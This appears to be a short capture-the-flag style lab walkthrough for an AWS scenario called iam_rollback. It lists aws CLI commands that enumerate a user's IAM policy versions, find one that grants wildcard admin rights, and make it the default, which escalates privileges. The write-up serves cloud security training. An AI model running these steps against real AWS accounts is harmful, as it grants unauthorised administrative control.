----------------

### Privesc by iam_rollback

----------------

- Enumerate privileges by enumerating policies-:

```bash
aws iam list-attached-user-policies --user-name raynor-* --profile aws_iam_rollback | jq
```

<img width="1288" height="198" alt="image" src="https://github.com/user-attachments/assets/a9bec182-4e59-4146-a8af-7e3290d1926a" />

- Enumerate the policy's arn versions-:

```bash
aws iam list-policy-versions --policy-arn arn:aws:iam::865614241237:policy/cg-raynor-policy-cgidqt1901nm4a --profile aws_iam_rollback | jq
```

<img width="1742" height="621" alt="image" src="https://github.com/user-attachments/assets/3a580bb8-69e0-4aed-be56-c9302af11a2e" />

- Enumerating through the versions till we notice `v3` with a wildcard for everything(admin rights).

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::865614241237:policy/cg-raynor-policy-cgidqt1901nm4a  --version-id v3 --profile aws_iam_rollback | jq
```
<img width="1798" height="384" alt="image" src="https://github.com/user-attachments/assets/027937e4-ba1e-4973-a88a-058b2a421b4d" />

- Setting the admin policy as the default version-:

```bash
aws iam set-default-policy-version --policy-arn arn:aws:iam::865614241237:policy/cg-raynor-policy-cgidqt1901nm4a --version-id v3 --profile aws_iam_rollback | jq
```
